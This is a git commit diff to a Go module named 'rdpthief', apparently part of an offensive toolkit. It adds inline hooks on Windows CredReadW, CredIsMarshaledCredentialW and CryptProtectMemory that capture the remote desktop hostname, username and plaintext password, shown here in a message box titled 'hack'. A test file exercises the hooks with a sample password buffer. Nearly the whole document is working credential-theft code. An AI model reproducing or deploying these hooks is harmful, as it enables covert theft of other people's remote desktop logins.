f8f240aa9910a1272e44a266e4faedde6da4e461
For-ACGN <38399410+For-ACGN@users.noreply.github.com>
2020-11-14 09:27:51 +0800

    module/windows/rdpthief/hook.go: update Hook.Install and Uninstall, update hook functions.

--- internal/module/windows/rdpthief/hook.go
+++ internal/module/windows/rdpthief/hook.go
@@ -2,12 +2,14 @@ package rdpthief
 
 import (
 	"fmt"
+	"reflect"
 	"sync"
+	"unicode/utf16"
 	"unsafe"
 
-	"github.com/pkg/errors"
 	"golang.org/x/sys/windows"
 
+	"project/internal/convert"
 	"project/internal/module/windows/hook"
 )
 
@@ -29,103 +31,220 @@ type Hook struct {
 	username string
 	password string
 
-	pgCredReadW *hook.PatchGuard
+	pgCredReadW                  *hook.PatchGuard
+	pgCredIsMarshaledCredentialW *hook.PatchGuard
+	pgCryptProtectMemory         *hook.PatchGuard
 
 	mu sync.Mutex
 }
 
 // Install is used to install hook.
 func (h *Hook) Install() error {
-	pg, err := hook.NewInlineHookByName("sechost.dll", "CredReadW", true, h.credReadW)
-	if err != nil {
-		return errors.WithMessage(err, "failed to install hook about CredReadW")
-	}
+	h.mu.Lock()
+	defer h.mu.Unlock()
 
+	var hookFn interface{}
+	hookFn = h.credReadW
+	pg, err := hook.NewInlineHookByName("advapi32.dll", "CredReadW", true, hookFn)
+	if err != nil {
+		return err
+	}
 	h.pgCredReadW = pg
 
+	hookFn = h.cryptProtectMemory
+	pg, err = hook.NewInlineHookByName("crypt32.dll", "CryptProtectMemory", true, hookFn)
+	if err != nil {
+		return err
+	}
+	h.pgCryptProtectMemory = pg
+
+	hookFn = h.credIsMarshaledCredentialW
+	pg, err = hook.NewInlineHookByName("advapi32.dll", "CredIsMarshaledCredentialW", true, hookFn)
+	if err != nil {
+		return err
+	}
+	h.pgCredIsMarshaledCredentialW = pg
 	return nil
 }
 
 // Uninstall is used to uninstall hook.
 func (h *Hook) Uninstall() error {
+	h.mu.Lock()
+	defer h.mu.Unlock()
+
+	err := h.pgCredReadW.UnPatch()
+	if err != nil {
+		return err
+	}
+	err = h.pgCredIsMarshaledCredentialW.UnPatch()
+	if err != nil {
+		return err
+	}
+	err = h.pgCryptProtectMemory.UnPatch()
+	if err != nil {
+		return err
+	}
 	return nil
 }
 
-func (h *Hook) credReadW(targetName *uint16, typ uint, flags uint, cred uintptr) uintptr {
+func (h *Hook) credReadW(targetName *uint16, typ, flags uint, credential uintptr) uintptr {
+	h.mu.Lock()
+	defer h.mu.Unlock()
+
+	proc := windows.NewLazySystemDLL("user32.dll").NewProc("MessageBoxW")
+	proc.Call(0,
+		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(fmt.Sprintln(windows.GetCurrentThreadId())))),
+		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
+		1,
+	)
+
+	// runtime.LockOSThread()
+	// defer runtime.UnlockOSThread()
+
+	proc.Call(0,
+		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(fmt.Sprintln(windows.GetCurrentThreadId())))),
+		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
+		1,
+	)
+
+	// proc := windows.NewLazySystemDLL("user32.dll").NewProc("MessageBoxW")
+	// proc.Call(0,
+	// 	uintptr(unsafe.Pointer(targetName)),
+	// 	uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
+	// 	1,
+	// )
+
 	hostname := windows.UTF16PtrToString(targetName)
 
-	fmt.Println(hostname)
-	fmt.Println(typ)
-	fmt.Println(flags)
-	fmt.Println(cred)
+	// fmt.Println(hostname)
+	// fmt.Println(typ)
+	// fmt.Println(flags)
+	// fmt.Println(cred)
+
+	h.hostname = hostname
 
 	ret, _, _ := h.pgCredReadW.Original.Call(
-		uintptr(unsafe.Pointer(targetName)), uintptr(typ), uintptr(flags), cred,
+		uintptr(unsafe.Pointer(targetName)), uintptr(typ), uintptr(flags), credential,
 	)
-	fmt.Println(ret)
-	return 123
+
+	// fmt.Println(uintptr(err.(windows.Errno)))
+	//
+	// fmt.Println(windows.GetLastError())
+	//
+	// proc := windows.NewLazySystemDLL("user32.dll").NewProc("MessageBoxW")
+	// proc.Call(0,
+	// 	uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(fmt.Sprintln(uintptr(err.(windows.Errno)))))),
+	// 	uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
+	// 	1,
+	// )
+
+	// lastErr := uintptr(err.(windows.Errno))
+	// runtime.SetLastError(lastErr)
+
+	// fmt.Println(runtime.GetLastError())
+	// fmt.Println(runtime.GetLastError())
+
+	// procSetLastError := windows.NewLazySystemDLL("kernel32.dll").NewProc("SetLastError")
+	// procSetLastError.Call(uintptr(err.(windows.Errno)))
+	//
+	// syscall.GetLastError()
+
+	// fmt.Println(ret, t2, err)
+
+	// proc.Call(0,
+	// 	uintptr(unsafe.Pointer(targetName)),
+	// 	uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
+	// 	1,
+	// )
+
+	return ret
+}
+
+func (h *Hook) credIsMarshaledCredentialW(marshaledCredential *uint16) uintptr {
+	h.mu.Lock()
+	defer h.mu.Unlock()
+
+	// proc := windows.NewLazySystemDLL("user32.dll").NewProc("MessageBoxW")
+	// proc.Call(0,
+	// 	uintptr(unsafe.Pointer(marshaledCredential)),
+	// 	uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
+	// 	1,
+	// )
+
+	username := windows.UTF16PtrToString(marshaledCredential)
+	// fmt.Println(username)
+
+	h.username = username
+
+	msg := fmt.Sprintf(
+		"hostname: \"%s\"\nusername: \"%s\"\npassword: \"%s\"",
+		h.hostname, h.username, h.password,
+	)
+
+	ptr := windows.StringToUTF16Ptr(msg)
+
+	proc := windows.NewLazySystemDLL("user32.dll").NewProc("MessageBoxW")
+	proc.Call(0,
+		uintptr(unsafe.Pointer(ptr)),
+		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
+		1,
+	)
+
+	ret, _, _ := h.pgCredIsMarshaledCredentialW.Original.Call(
+		uintptr(unsafe.Pointer(marshaledCredential)),
+	)
+	return ret
+}
+
+func (h *Hook) cryptProtectMemory(address *byte, size, flags uint) uintptr {
+	h.mu.Lock()
+	defer h.mu.Unlock()
+
+	// skip data that not contain password
+	if *address == 2 && size != 16 {
+		ret, _, _ := h.pgCryptProtectMemory.Original.Call(
+			uintptr(unsafe.Pointer(address)), uintptr(size), uintptr(flags),
+		)
+		return ret
+	}
+
+	ptr := windows.StringToUTF16Ptr("mem")
+	proc := windows.NewLazySystemDLL("user32.dll").NewProc("MessageBoxW")
+	proc.Call(0,
+		uintptr(unsafe.Pointer(ptr)),
+		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("hack"))),
+		1,
+	)
+
+	var data []byte
+	dataSH := (*reflect.SliceHeader)(unsafe.Pointer(&data))
+	dataSH.Data = uintptr(unsafe.Pointer(address))
+	dataSH.Len = int(size)
+	dataSH.Cap = int(size)
+
+	passwordLen := convert.LEBytesToUint32(data[:4])
+
+	// fmt.Println(passwordLen)
+
+	password := make([]byte, passwordLen)
+
+	copy(password, data[4:4+passwordLen])
+
+	passwordSH := (*reflect.SliceHeader)(unsafe.Pointer(&password))
+	passwordSH.Len = passwordSH.Len / 2
+	passwordSH.Cap = passwordSH.Cap / 2
+
+	passwordStr := utf16.Decode(*(*[]uint16)(unsafe.Pointer(&password)))
+	h.password = fmt.Sprintln("\"" + string(passwordStr) + "\"")
+
+	ret, _, _ := h.pgCryptProtectMemory.Original.Call(
+		uintptr(unsafe.Pointer(address)), uintptr(size), uintptr(flags),
+	)
+	return ret
+
 }
 
 // ReadCredentials is used to read credentials from mstsc.exe.
 func ReadCredentials(pid uint32) ([]*Credential, error) {
 	return nil, nil
 }
-
-// func hookFn(address *byte, size uint32, flags uint32) uintptr {
-//	// skip data that not contain password
-//	if *address == 2 && size != 16 {
-//		hook.Close()
-//
-//		ret, _, _ := target.Call(uintptr(unsafe.Pointer(address)), uintptr(size), uintptr(flags))
-//
-//		var err error
-//		arch, _ := hinako.NewRuntimeArch()
-//		hook, err = hinako.NewHookByName(arch, "Crypt32.dll", "CryptProtectMemory", hookFn)
-//		if err != nil {
-//			log.Fatalf("failed to hook MessageBoxW: %+v", err)
-//		}
-//
-//		// ret, _, _ := target.Call(uintptr(unsafe.Pointer(address)), uintptr(size), uintptr(flags))
-//		return ret
-//	}
-//
-//	var data []byte
-//
-//	dataSH := (*reflect.SliceHeader)(unsafe.Pointer(&data))
-//	dataSH.Data = uintptr(unsafe.Pointer(address))
-//	dataSH.Len = int(size)
-//	dataSH.Cap = int(size)
-//
-//	// a := syscall.StringToUTF16Ptr(string(data))
-//	// b := syscall.StringToUTF16Ptr(string(data))
-//
-//	ss := convert.LEBytesToUint32(data[:4])
-//
-//	password := data[4 : 4+int(ss)]
-//
-//	// 	_, _, _ = msgbox.Call(0, uintptr(unsafe.Pointer(a)), uintptr(unsafe.Pointer(b)), 0)
-//	msgbox.Call(0, uintptr(unsafe.Pointer(&password[0])), wstrPtr("password"), 0)
-//	// fmt.Println("receive data:", data)
-//	// fmt.Println(flags)
-//
-//	// fmt.Println(hWnd, lpText, lpCaption, uType)
-//	//
-//	// ptr1, _ := syscall.UTF16PtrFromString("hooked!")
-//	// ptr2, _ := syscall.UTF16PtrFromString("hooked222!")
-//	//
-//	// fmt.Println("data2:", *(*[16]byte)(unsafe.Pointer(originalMessageBoxW.Addr())))
-//	//
-//	hook.Close()
-//
-//	ret, _, _ := target.Call(uintptr(unsafe.Pointer(address)), uintptr(size), uintptr(flags))
-//
-//	var err error
-//	arch, _ := hinako.NewRuntimeArch()
-//	hook, err = hinako.NewHookByName(arch, "Crypt32.dll", "CryptProtectMemory", hookFn)
-//	if err != nil {
-//		log.Fatalf("failed to hook MessageBoxW: %+v", err)
-//	}
-//
-//	// fmt.Println(r)
-//	return ret
-// }
--- internal/module/windows/rdpthief/hook_test.go
+++ internal/module/windows/rdpthief/hook_test.go
@@ -14,12 +14,40 @@ func TestHook_Install(t *testing.T) {
 	err := h.Install()
 	require.NoError(t, err)
 
-	ptr := windows.StringToUTF16Ptr("test")
+	ptr := windows.StringToUTF16Ptr("host")
 
-	proc := windows.NewLazySystemDLL("sechost.dll").NewProc("CredReadW")
-	ret, _, _ := proc.Call(uintptr(unsafe.Pointer(ptr)), 1, 1, 123)
-	fmt.Println(ret)
+	proc := windows.NewLazySystemDLL("advapi32.dll").NewProc("CredReadW")
+	ret, _, err := proc.Call(uintptr(unsafe.Pointer(ptr)), 1, 1, 123)
+	fmt.Println("0", ret)
+	fmt.Println("err", err)
 
+	fmt.Printf("0x%X\n", proc.Addr())
+
+	password := []byte{
+		0x0c, 0x00, 0x00, 0x00, 0x61, 0x00, 0x61, 0x00, 0x61, 0x00,
+		0x73, 0x00, 0x73, 0x00, 0x73, 0x00,
+	}
+	proc = windows.NewLazySystemDLL("crypt32.dll").NewProc("CryptProtectMemory")
+	ret, _, _ = proc.Call(uintptr(unsafe.Pointer(&password[0])), 16, 1)
+	fmt.Println("1", ret)
+
+	fmt.Printf("0x%X\n", proc.Addr())
+
+	ptr2 := windows.StringToUTF16Ptr("username")
+	proc = windows.NewLazySystemDLL("advapi32.dll").NewProc("CredIsMarshaledCredentialW")
+	ret, _, _ = proc.Call(uintptr(unsafe.Pointer(ptr2)))
+	fmt.Println("2", ret)
+
+	fmt.Printf("0x%X\n", proc.Addr())
+
+	select {}
+
+	err = h.Uninstall()
+	require.NoError(t, err)
+	//
+	// asd := Hook{}
+	// err = asd.Install()
+	// require.NoError(t, err)
 }
 
 func TestReadCredentials(t *testing.T) {
